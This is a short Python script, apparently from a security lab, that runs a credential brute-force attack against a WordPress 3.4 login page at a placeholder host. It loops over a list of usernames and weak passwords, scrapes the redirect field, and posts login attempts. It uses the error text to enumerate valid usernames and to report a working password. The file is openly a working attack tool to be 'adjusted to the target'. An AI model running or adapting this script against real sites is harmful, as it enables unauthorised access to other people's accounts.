#!/usr/bin/python

# Python script to perform a brute force attack against WordPress 3.4
# It must be adjusted to the target.


import requests
import sys

requests.packages.urllib3.disable_warnings()

server = 'http://aludra.stars.example/wordpress/wp-login.php'
users= ['alovelace','aturing','awhitehead','acayley','jfourier',
        'cgauss','egalois','jmaxwell','hpoincare','sgermain']
passwords = ['pass','password','Pass','letmein','password1',
             'Password','password1!']
for user in users:
  for password in passwords:

    r1 = requests.get(server,verify=False)
    s1 = r1.text.split('input type="hidden" name="redirect_to" value="')
    redir = s1[1].split('"')[0]

    postvars = {'log':user,
                'pwd':password,
                'wp-submit':'Log In',
                'redirect_to':redir,
                'testcookie':'1'}

    r2 = requests.post(server,postvars,cookies=r1.cookies,verify=False)

    if 'Invalid username' in r2.text:
      break

    if not ('The password you entered for the username' in r2.text):
       print "User: {}\nPassword: {}".format(user,password)
